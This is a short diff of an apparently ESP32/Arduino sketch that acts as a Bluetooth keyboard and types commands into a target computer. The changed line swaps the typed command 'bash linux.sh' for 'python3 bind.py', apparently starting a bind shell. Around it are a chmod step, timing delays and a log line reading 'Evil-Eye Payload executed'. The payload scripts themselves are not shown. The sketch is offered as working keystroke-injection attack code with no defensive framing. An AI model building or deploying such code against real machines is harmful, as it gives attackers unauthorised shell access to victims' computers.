@@ -300,7 +300,7 @@ void loop() {
       bleKeyboard.press(KEY_RETURN); delay(500); 
       bleKeyboard.releaseAll(); delay(1000); // Quick chmod
       Serial.println("Set executable permissions");
-      sendString("bash linux.sh", 50); delay(1000); // 50ms per char, 1000ms before RETURN
+      sendString("python3 bind.py", 50); delay(1000); // 50ms per char, 1000ms before RETURN
       bleKeyboard.press(KEY_RETURN); delay(500);
       bleKeyboard.releaseAll(); delay(10000); // Increased for script startup
       Serial.println("Evil-Eye Payload executed");
@@ -349,5 +349,6 @@ void loop() {
   }
   delay(50); // Debounce/stability
 }
+
 
 
